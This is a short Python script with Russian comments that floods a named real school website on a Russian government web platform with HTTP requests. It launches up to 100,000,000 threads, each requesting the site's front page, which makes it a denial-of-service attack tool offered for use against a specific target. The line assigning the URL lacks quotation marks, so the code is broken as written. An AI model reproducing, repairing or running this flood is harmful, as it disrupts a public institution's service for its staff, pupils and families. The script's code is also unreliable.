import requests
from time import sleep
from colorama import *
import threading
import socket

init()

# Получаем IP-адрес
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
print(Fore.RED + Style.BRIGHT + f"""
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⡿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣦⠀⠀⠀⠀           
⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⠀⠀⠀⠀               Потоков: 100000     
⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀               IP: {ip_address}        
⠀⠀⠀⠀⢠⣿⣿⣿⣿⡿⣿⣿⣧⣀⠀⠀            
⠀⠀⠀⠀⢺⣿⣿⣿⣿⣧⣬⣻⢿⣿⣿⡦
⠀⠀⠀⠀⠀⠙⠻⠿⢿⣿⣿⣿⣿⡏⠛⠁
⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⣽⣿⡿⠁⠀⠀
⠀⢀⡠⣿⣷⣤⡀⠀⠀⢸⣿⣿⠃⠀⠀⠀
⠰⠿⠿⠿⠿⠿⠇⠀⠠⠿⠿⠏⠀  
         """)

#сайт https://shkola25sarapul-r18.gosweb.gosuslugi.ru/
url = https://shkola25sarapul-r18.gosweb.gosuslugi.ru/

def send_request(i):
    response = requests.get(url)
    if response.status_code == 200:
        print(Fore.GREEN + f"Запрос {i+1} выполнен")
    else:
        print(Fore.RED + f"Запрос {i+1} ошибка: {response.status_code}")

threads = []
for i in range(100000000):
    thread = threading.Thread(target=send_request, args=(i,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()